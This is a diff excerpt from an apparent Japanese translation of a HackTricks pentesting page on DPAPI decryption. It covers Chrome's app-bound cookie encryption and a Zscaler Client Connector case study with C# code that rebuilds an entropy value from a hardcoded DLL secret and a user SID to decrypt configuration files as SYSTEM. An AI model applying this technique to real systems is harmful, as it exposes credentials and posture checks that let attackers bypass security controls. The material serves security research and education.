+* **Chrome 127 “App-Bound” cookie encryption**（2024年7月）は従来の DPAPI のみの保護に代わり、ユーザの **Credential Manager** に格納された追加キーを導入しました。クッキーのオフライン復号には現在、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要です。SharpChrome v2.3 および DonPAPI 2.x はユーザコンテキストで実行することで追加キーを回復可能です。
 
 
-### 事例: Zscaler Client Connector – SID から導出されるカスタムエントロピー
+### ケーススタディ: Zscaler Client Connector – SIDから導出されるカスタムエントロピー
 
-Zscaler Client Connector は `C:\ProgramData\Zscaler` に複数の設定ファイル（例: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`）を保存します。各ファイルは **DPAPI (Machine scope)** で暗号化されていますが、ベンダーはディスクに保存する代わりに実行時に*計算される* **custom entropy** を提供します。
+Zscaler Client Connector は `C:\ProgramData\Zscaler` 以下に複数の設定ファイル（例: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`）を格納します。各ファイルは **DPAPI (Machine scope)** で暗号化されますが、ベンダはディスクに保存するのではなく *実行時に計算される* **custom entropy** を提供します。
 
-エントロピーは次の2要素から再構築されます:
+エントロピーは次の2つの要素から再構築されます：
 
 1. `ZSACredentialProvider.dll` に埋め込まれたハードコードされたシークレット。
 2. 設定が属する Windows アカウントの **SID**。
 
-DLL によって実装されているアルゴリズムは次と等価です:
+DLL によって実装されているアルゴリズムは次と等価です：
 ```csharp
 byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
 byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
@@ -328,17 +409,17 @@ byte[] entropy = new byte[tmp.Length / 2];
 for (int i = 0; i < entropy.Length; i++)
 entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
 ```
-秘密はディスクから読み取れるDLLに埋め込まれているため、**SYSTEM権限を持つ任意のローカル攻撃者は任意のSIDのエントロピーを再生成でき**、blobsをオフラインで復号できます:
+秘密がディスクから読み取れるDLLに埋め込まれているため、**SYSTEM権限を持つ任意のローカル攻撃者は任意のSIDのエントロピーを再生成し**、オフラインでブロブを復号できます:
 ```csharp
 byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-Decryption yields the complete JSON configuration, including every **device posture check** and its expected value – information that is very valuable when attempting client-side bypasses.
+復号すると、すべての **device posture check** とその期待値を含む完全な JSON 設定が得られます — これはクライアント側のバイパスを試みる際に非常に有用な情報です。
 
-> TIP: the other encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) are protected with DPAPI **without** entropy (`16` zero bytes). They can therefore be decrypted directly with `ProtectedData.Unprotect` once SYSTEM privileges are obtained.
+> TIP: 他の暗号化されたアーティファクト（`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`）はDPAPI **without** entropy（`16` zero bytes）で保護されています。したがって、SYSTEM 権限を取得すれば `ProtectedData.Unprotect` で直接復号できます。
 
-## References
+## 参考資料
 
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
@@ -350,5 +431,8 @@ Decryption yields the complete JSON configuration, including every **device post
 - [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
 - [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
 - [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
+- [Impacket – dpapi.py](https://github.com/fortra/impacket)
+- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)
 
 {{#include ../../banners/hacktricks-training.md}}
